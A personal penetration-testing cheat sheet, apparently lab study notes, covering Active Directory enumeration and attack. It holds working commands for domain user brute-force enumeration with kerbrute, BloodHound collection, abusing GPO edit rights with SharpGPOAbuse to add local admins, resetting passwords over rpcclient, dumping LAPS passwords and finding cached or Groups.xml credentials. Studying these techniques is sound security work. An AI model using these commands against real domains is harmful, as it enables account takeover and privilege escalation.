# AD
- ``` xfreerdp /u:stephanie /d:corp.com /v:192.168.50.75 ``` req domain name if AD activated
- target domain admin
- Detail of AD Domain ``` Get-ADdomain ```
- Check role usage: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups
- Login as local host in CMD: ``` .\myname```

## Manual Enum
### Legacy Tools
- w/ CMD / PWSH
- ``` net user {user name} /domain ``` get user info | get all without providing
- ``` net group "{group name}" /domain ``` get user list in xx group | get all without providing name
### From Kali
- ``` impacket-getadusers -all {domain}/{username} -dc-ip {ip} ```

### .NET & Pwsh modules/classes
1. Get ldap path (since ldap can support other than AD)
- Pwsh only
  - ```$domainObj =  [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() ``` check domain by PdcRoleOwner 
  - ``` $DN = ([adsi]'').distinguishedName ``` check domain by adsi
  - ps1 module to get LDAP path
       ``` 
          $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
          $DN = ([adsi]'').distinguishedName 
          $LDAP = "LDAP://$PDC/$DN"
          $LDAP
       ``` 

2. Enum by ldap ``` $direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP) ```
   - user type id:  samAccountType=805306368 
   - LDAP search ps1 module: 
     ``` 
       function LDAPSearch {
       param (
           [string]$LDAPQuery
       )

       $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
       $DistinguishedName = ([adsi]'').distinguishedName

       $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

       $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

       return $DirectorySearcher.FindAll()

       }
       ``` 
   - usage: ``` LDAPSearch -LDAPQuery "(objectclass=group)" ```
   - reference LDAP query online for query issue
   - Group maybe nested which means its a tree. Group A -> Group B + C -> Group D -> User

## Auto Get SPN (Choose me first)
- https://github.com/compwiz32/PowerShell/blob/master/Get-SPN.ps1?source=post_page-----b95d3146cfe9--------------------------------

## Manually Get SPN 
- ``` Get-ADUser -Filter {SamAccountName -eq "{USERNAME}"} -Properties ServicePrincipalNames ```

### Auto Enum 
- LDAP Dump (https://github.com/n00py/LAPSDumper): ``` python laps.py -u user -p password -d domain.local ```
- PowerView.ps1 ``` Import-Module .\PowerView.ps1 ```
- https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993 
- ``` Get-NetUser ``` | ``` Get-NetGroup ``` common cmd
  
## Useful Info
### OS
-  w/ powerview.ps1
-  ``` Get-NetComputer ``` get all details of computer object in the doman
-  ``` Get-NetComputer | select operatingsystem,operatingsystemversion,dnshostname,distinguishedname ``` OS & OSVersion & HostName & {cn=??,cn=??,dc=??,dc=??,ou=??}@LDAP
-  usually fuck the oldest OS first

### Permissions & LoggedOn@Users
#### w/ powerview.ps1
1. ``` Find-LocalAdminAccess ``` find all computers in domain has admin access with current user context
2.  ``` Get-NetSession -ComputerName {computer name} -Verbose ``` check users logged in on that computer
    -  5 level of net session enum: lv0: only have name | lv1,2 more info but req admin | lv10,502 more info 
3.  ``` Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl ``` view permissions of "NetSessionEnum" in registry path:``` HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity ```
-  registry key : ``` SrvsvcSessionInfo ```

### Group Policy
1. Check domain policy ``` Get-GPO -Name "Default Domain Policy" ```
2. check user permission ``` Get-GPPermission -Guid {ID get from step 1} -TargetType User -TargetName {domain user name only} ```
3. IF Saw GpoEdit permission: https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master
4. run ``` .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount {domain user name} --GPOName "Default Domain Policy" ```
5. update policy ``` gpupdate /force ```

####  w/ psloggedon.exe
-  req ``` Remote Registry ``` service & admin
-  ``` .\PsLoggedon.exe \\files04 ``` check recent loggin activity on certain machine
-  try to see if he/she has loggon other machine before = can access again!

### Principal Names
- Target Service prinicipal 
- ``` setspn -L {service name} ``` from setspn.exe (built-in) 
- ``` Get-NetUser -SPN | select samaccountname,serviceprincipalname ``` from powerview.ps1

### Object permission (Access Control Entries & ACL)
- ``` 
    GenericAll: Full permissions on object
    GenericWrite: Edit certain attributes on the object
    WriteOwner: Change ownership of the object
    WriteDACL: Edit ACE's applied to object
    AllExtendedRights: Change password, reset password, etc.
    ForceChangePassword: Password change for object
    Self (Self-Membership): Add ourselves to for example a group
  ```
- ``` Get-ObjectAcl -Identity {object name} ``` from powerview.ps1: get details of the object with the name e.g. ObjectSID & SecurityIdentifier & ActiveDirectoryRights
- ``` Convert-SidToName {sid} ```  from powerview.ps1: convert to domain object name e.g. CORP\hoidam
- ``` 
    Get-ObjectAcl -Identity {object name} | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
  ```
  check who has rights to interact with this object (permission as above)
- Can assign users to that group e.g. ``` net group "Management Department" stephanie /del /domain ```
- ``` Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains "DnsAdmins"} | ft ```

### Domain Shares (SMB)
- ``` Find-DomainShare ``` from powersview.ps1 
- check directory with ls 
- interesting files: sysvol . Have domain policy file (for DC)
- $ dollar sign = hidden share

# RPC
- Microsoft Remote Procedure Call (RPC) defines a powerful technology for creating distributed client/server programs.
- Target Domain controller
- ``` rpcclient -U "" {ip}``` can be empty also
## Identified 139 & 445 Port can try:
- Try more commands instead of enum
- ``` rpcclient -U "{Username}" {ip}```
- ``` [rpcclient $>] setuserinfo2 {username} 23 {password}``` change user password (number 23) https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN 

## Enum
1. enumdomusers
2. enumdomgroups
3. queryusergroups {rid of that user}
   
## Kerbrute
- https://github.com/ropnop/kerbrute/releases/tag/v1.0.3
- ``` ./kerbrute userenum --dc {dc-ip} -d {domain name} /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt ``` brute force enum the user name in dc
- 

# Auto Enum
## SharpHound
- ``` Import-Module .\Sharphound.ps1 ```
- ``` Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix {custom prefix name} ``` Get all
- enable ``` looping ``` to make snapshot (record changes)

## BloodHound
- start neo4j : ``` sudo neo4j start ```
- start bloodhound ``` sudo bloodhound ```
- neo4j browser: ``` http://localhost:7474/browser  ```
- my neo4j ~ usrname: neo4j | password: kali
- reset db: ``` sudo rm -rf /usr/share/neo4j/data ```
- get new data set when have new user compromised
- useful thing: local admin rights -> first degree local admin
- Thoughts: Can start from AD -> switch user by abusing AD weakness e.g. can control someone AD password -> login to that guy (maybe that guy is local admin of some machine) -> boom

### BloodHound Intersting Path
- Reading Node info harder!!  (those you owned / rooted)
1. Outbound Object Control: 1st degree
2. RDP Privileges

## Running Bloodhound in kali
- https://github.com/dirkjanm/BloodHound.py 
- ``` python3 ~/Downloads/WindowUsefulTools/BloodHoundKali/bloodhound.py -c all -dc {FQDN || NOT DOMAIN NAME} -d {domain name} -u {username} -p {password} -ns {name server ip} ```


## Useful query
- Show all computers/users ``` MATCH (m:Computer/User) RETURN m ```
- Show all active sessions ``` MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p ```

# Window shit
1. change user: ``` runas /user:{domain_name}\{user_name} "cmd" ```
2. change someone password: ``` net user {username} {new password} /domain ``` 
3. remote using ``` runas /netonly /user:{domain_name}\{user_name} cmd```
4. add someone to local admin: ``` net localgroup Administrators ms01\mary.williams /add ```
## Get stored credentials
1. ``` cmdkey /list ``` (if someone ran ```runas /savedcred ```, will have cached secrets )

## Interesting file
1. Group.xml ``` have username cpassword @ domain ``` 

# LAPS
1. if found user name with LADMIN -> high prob can crack by pyLAPS
2. they have different password on every machine but same domain name